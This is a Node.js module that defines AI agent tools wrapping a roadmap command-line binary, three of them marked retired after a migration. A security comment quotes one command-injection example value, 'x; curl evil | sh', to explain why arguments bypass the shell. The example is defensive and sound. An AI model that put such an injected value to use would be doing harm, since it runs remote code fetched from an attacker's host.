/**
 * ROADY Roadmap Tools
 *
 * 8 tool handlers wrapping roadmap-cli commands via child_process.
 * Each tool executes `roadmap-cli <command>` and returns structured JSON.
 * The roadmap-cli binary reads/writes ~/STRATEGIC_ROADMAP.json.
 */

const { hostHome, hostPath } = require('../utils/runtimePaths.js');
const { execFileSync: _execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const ROADMAP_CLI = hostPath('bin', 'roadmap-cli');
const ROADMAP_JSON = hostPath('STRATEGIC_ROADMAP.json');
const PLAN_DOC_BASE = hostPath('quox-dashboard');

// QUOXPLAN-CUTOVER (2026-07-25): the strategic roadmap now lives in
// QuoxPlan. roadmap_list / roadmap_show / roadmap_stats are retired —
// they no longer shell out or read STRATEGIC_ROADMAP.json, they just point
// agents at the QuoxPlan tools. Kept registered (rather than removed) so
// old prompts/skills that still reference these names get a clear pointer
// instead of an "unknown tool" error.
const RETIREMENT_MESSAGE = 'Retired at the 2026-07-25 cutover: the roadmap lives in QuoxPlan. Use quoxplan_roadmaps / quoxplan_streams / quoxplan_stream_brief (roadmap id quox-strategic).';

// Mutable reference for testing — tests can replace via _setExecFileSync()
let _execFn = _execFileSync;

// SECURITY (C1 fix): args MUST be an array passed to execFile/execFileSync
// with shell:false (the default for execFileSync). Never string-interpolate
// user-controlled values into a shell command — that allows command
// injection (e.g. stream_id = "x; curl evil | sh"). Each element of `args`
// is passed as a literal argv entry to the roadmap-cli binary; no shell
// metacharacters (;, |, $(), &&, backticks, etc.) are ever interpreted.
function runCli(args) {
  if (!Array.isArray(args)) {
    throw new Error('runCli() requires an array of arguments, not a string');
  }
  try {
    const output = _execFn(ROADMAP_CLI, args, {
      encoding: 'utf8',
      timeout: 10000,
      env: { ...process.env, HOME: hostHome(), NO_COLOR: '1' },
    });
    // Strip ANSI codes
    return output.replace(/\x1b\[[0-9;]*m/g, '').trim();
  } catch (err) {
    return err.stdout ? err.stdout.replace(/\x1b\[[0-9;]*m/g, '').trim() : err.message;
  }
}

function readRoadmapJSON() {
  try {
    return JSON.parse(fs.readFileSync(ROADMAP_JSON, 'utf8'));
  } catch {
    return { streams: [], completed: [] };
  }
}

// ─── Tool Definitions ────────────────────────────────────────────────────────

const ROADMAP_TOOLS = {

  roadmap_list: {
    name: 'roadmap_list',
    description: 'RETIRED at the 2026-07-25 QuoxPlan cutover. Returns a pointer only — no data. Use quoxplan_roadmaps / quoxplan_streams / quoxplan_stream_brief (roadmap id "quox-strategic") instead.',
    input_schema: {
      type: 'object',
      properties: {
        filter: { type: 'string', enum: ['all', 'active', 'blocked', 'completed', 'tier1', 'tier2'], description: 'Filter streams by status or tier' },
      },
    },
    execute: async () => ({ success: false, retired: true, message: RETIREMENT_MESSAGE }),
  },

  roadmap_show: {
    name: 'roadmap_show',
    description: 'RETIRED at the 2026-07-25 QuoxPlan cutover. Returns a pointer only — no data. Use quoxplan_roadmaps / quoxplan_streams / quoxplan_stream_brief (roadmap id "quox-strategic") instead.',
    input_schema: {
      type: 'object',
      properties: {
        stream_id: { type: 'string', description: 'Stream ID (e.g. "GOV", "TRV", "CRP-BE")' },
      },
      required: ['stream_id'],
    },
    execute: async () => ({ success: false, retired: true, message: RETIREMENT_MESSAGE }),
  },

  roadmap_status: {
    name: 'roadmap_status',
    description: 'Update the status of a stream. Valid statuses: NOT_STARTED, IN_PROGRESS, COMPLETE, BLOCKED, DECISION_NEEDED.',
    input_schema: {
      type: 'object',
      properties: {
        stream_id: { type: 'string', description: 'Stream ID' },
        status: { type: 'string', enum: ['NOT_STARTED', 'IN_PROGRESS', 'COMPLETE', 'BLOCKED', 'DECISION_NEEDED'], description: 'New status' },
      },
      required: ['stream_id', 'status'],
    },
    execute: async ({ stream_id, status }) => {
      const output = runCli(['status', stream_id, status]);
      return { success: true, result: output };
    },
  },

  roadmap_move: {
    name: 'roadmap_move',
    description: 'Change the priority position of a stream in the roadmap.',
    input_schema: {
      type: 'object',
      properties: {
        stream_id: { type: 'string', description: 'Stream ID' },
        position: { type: 'number', description: 'New priority position number' },
      },
      required: ['stream_id', 'position'],
    },
    execute: async ({ stream_id, position }) => {
      const output = runCli(['move', stream_id, String(position)]);
      return { success: true, result: output };
    },
  },

  roadmap_update: {
    name: 'roadmap_update',
    description: 'Update a field on a stream (e.g. phases_done, notes, effort, summary).',
    input_schema: {
      type: 'object',
      properties: {
        stream_id: { type: 'string', description: 'Stream ID' },
        field: { type: 'string', description: 'Field to update (phases_done, notes, effort, summary, plan_doc)' },
        value: { type: 'string', description: 'New value for the field' },
      },
      required: ['stream_id', 'field', 'value'],
    },
    execute: async ({ stream_id, field, value }) => {
      const output = runCli(['update', stream_id, field, value]);
      return { success: true, result: output };
    },
  },

  roadmap_add: {
    name: 'roadmap_add',
    description: 'Add a new stream to the roadmap. Provide a JSON string with at minimum: id, name, tier, effort, summary.',
    input_schema: {
      type: 'object',
      properties: {
        stream_json: { type: 'string', description: 'JSON string with stream definition: {"id":"XX","name":"...","tier":3,"effort":"...","summary":"..."}' },
      },
      required: ['stream_json'],
    },
    execute: async ({ stream_json }) => {
      // Passed as a single literal argv entry — no shell quoting/escaping
      // needed or wanted (see C1 fix note on runCli()).
      const output = runCli(['add', stream_json]);
      return { success: true, result: output };
    },
  },

  roadmap_stats: {
    name: 'roadmap_stats',
    description: 'RETIRED at the 2026-07-25 QuoxPlan cutover. Returns a pointer only — no data. Use quoxplan_roadmaps / quoxplan_streams / quoxplan_stream_brief (roadmap id "quox-strategic") instead.',
    input_schema: {
      type: 'object',
      properties: {},
    },
    execute: async () => ({ success: false, retired: true, message: RETIREMENT_MESSAGE }),
  },

  roadmap_plan_doc: {
    name: 'roadmap_plan_doc',
    description: 'Retrieve the plan document for a stream. Returns the markdown content of the plan doc file.',
    input_schema: {
      type: 'object',
      properties: {
        stream_id: { type: 'string', description: 'Stream ID — will look up the plan_doc path from the roadmap' },
      },
      required: ['stream_id'],
    },
    execute: async ({ stream_id }) => {
      const data = readRoadmapJSON();
      const all = [...(data.streams || []), ...(data.completed || [])];
      const stream = all.find(s => s.id.toLowerCase() === stream_id.toLowerCase());

      if (!stream) return { success: false, error: `Stream "${stream_id}" not found` };
      if (!stream.plan_doc) return { success: false, error: `Stream "${stream_id}" has no plan document` };

      const cleanPath = stream.plan_doc.replace(/^quox-dashboard\//, '');
      const fullPath = path.join(PLAN_DOC_BASE, cleanPath);

      try {
        const content = fs.readFileSync(fullPath, 'utf8');
        return {
          success: true,
          stream_id: stream.id,
          path: stream.plan_doc,
          content,
          line_count: content.split('\n').length,
        };
      } catch (err) {
        return { success: false, error: `Failed to read plan doc: ${err.message}`, path: fullPath };
      }
    },
  },
};

// ─── Tool Registration Helper ────────────────────────────────────────────────

function getRoadmapToolDefinitions() {
  return Object.values(ROADMAP_TOOLS).map(t => ({
    name: t.name,
    description: t.description,
    input_schema: t.input_schema,
  }));
}

function executeRoadmapTool(name, input) {
  const tool = ROADMAP_TOOLS[name];
  if (!tool) throw new Error(`Unknown roadmap tool: ${name}`);
  return tool.execute(input || {});
}

module.exports = {
  ROADMAP_TOOLS,
  getRoadmapToolDefinitions,
  executeRoadmapTool,
  runCli,
  // Test helpers — allow tests to inject a mock execFileSync (see geminiCli.js
  // for the same pattern) instead of shelling out to the real CLI/binary.
  _setExecFileSync: (fn) => { _execFn = fn; },
  _resetExecFileSync: () => { _execFn = _execFileSync; },
};
